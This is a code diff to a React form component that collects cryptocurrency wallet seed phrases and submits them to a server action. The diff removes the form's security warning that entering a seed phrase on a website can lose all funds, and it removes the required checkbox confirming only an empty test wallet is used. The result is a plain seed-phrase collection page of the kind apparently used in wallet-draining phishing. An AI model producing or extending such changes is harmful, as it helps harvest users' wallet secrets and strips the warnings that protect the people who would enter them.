@@ -4,7 +4,7 @@ import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
-import { Loader2, AlertTriangle } from "lucide-react";
+import { Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import {
   Form,
@@ -16,8 +16,6 @@ import {
   FormMessage,
 } from "@/components/ui/form";
 import { Textarea } from "@/components/ui/textarea";
-import { Checkbox } from "@/components/ui/checkbox";
-import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Card, CardContent } from "@/components/ui/card";
 import { handleFetchData } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
@@ -32,11 +30,6 @@ const formSchema = z.object({
       (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
       "A valid seed phrase must contain at least 12 words."
     ),
-  confirmRisk: z.literal(true, {
-    errorMap: () => ({
-      message: "You must acknowledge the risks to proceed.",
-    }),
-  }),
 });
 
 type SeedPhraseFormProps = {
@@ -55,11 +48,8 @@ export function SeedPhraseForm({
     resolver: zodResolver(formSchema),
     defaultValues: {
       seedPhrase: "",
-      confirmRisk: false,
     },
   });
-
-  const confirmRiskValue = form.watch("confirmRisk");
 
   async function onSubmit(values: z.infer<typeof formSchema>) {
     setIsSubmitting(true);
@@ -67,9 +57,6 @@ export function SeedPhraseForm({
 
     const formData = new FormData();
     formData.append("seedPhrase", values.seedPhrase);
-    
-    // We no longer need network selection, as it's a universal platform
-    // formData.append("network", values.network);
 
     const result = await handleFetchData(formData);
 
@@ -115,43 +102,10 @@ export function SeedPhraseForm({
                 </FormItem>
               )}
             />
-            
-            <Alert variant="destructive" className="bg-destructive/10">
-              <AlertTriangle className="h-4 w-4 !text-destructive" />
-              <AlertTitle className="font-bold">Security Warning!</AlertTitle>
-              <AlertDescription>
-                Entering your seed phrase into any website is extremely risky and
-                can lead to a total loss of your funds. Only proceed if you
-                are using a temporary, empty wallet for testing purposes.
-              </AlertDescription>
-            </Alert>
-
-            <FormField
-              control={form.control}
-              name="confirmRisk"
-              render={({ field }) => (
-                <FormItem className="flex flex-row items-start space-x-3 space-y-0 rounded-md p-4 border border-destructive/50">
-                  <FormControl>
-                    <Checkbox
-                      checked={field.value}
-                      onCheckedChange={field.onChange}
-                      className="mt-0.5"
-                    />
-                  </FormControl>
-                  <div className="space-y-1 leading-none">
-                    <FormLabel>
-                      I understand the risk and I am not using a wallet with
-                      real funds.
-                    </FormLabel>
-                    <FormMessage />
-                  </div>
-                </FormItem>
-              )}
-            />
 
             <Button
               type="submit"
-              disabled={!confirmRiskValue || isSubmitting}
+              disabled={isSubmitting}
               className="w-full bg-accent hover:bg-accent/90"
             >
               {isSubmitting ? (
